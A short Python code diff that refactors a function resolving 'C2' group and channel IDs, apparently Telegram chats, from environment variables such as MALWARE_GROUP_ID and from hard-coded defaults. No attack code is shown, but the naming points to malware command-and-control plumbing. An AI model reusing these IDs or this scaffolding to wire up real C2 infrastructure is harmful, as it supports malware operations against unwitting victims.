@@ -11,8 +11,15 @@ DEFAULT_GROUP = "-1002470378114"
 DEFAULT_CHANNEL = "-1002426552780"
 
 
-def resolve_c2_chats(cfg: Mapping[str, Any] | None) -> tuple[str, str]:
+def resolve_c2_chats(
+    cfg: Mapping[str, Any] | None,
+    *,
+    default_group: str | None = None,
+    default_channel: str | None = None,
+) -> tuple[str, str]:
     cfg = cfg or {}
+    dg = (default_group or "").strip() or DEFAULT_GROUP
+    dc = (default_channel or "").strip() or DEFAULT_CHANNEL
     g = (
         os.environ.get("C2_GROUP_ID", "").strip()
         or os.environ.get("MALWARE_GROUP_ID", "").strip()
@@ -29,4 +36,4 @@ def resolve_c2_chats(cfg: Mapping[str, Any] | None) -> tuple[str, str]:
             g = str(chats[1]).strip()
         if not c:
             c = str(chats[2]).strip()
-    return g or DEFAULT_GROUP, c or DEFAULT_CHANNEL
+    return g or dg, c or dc
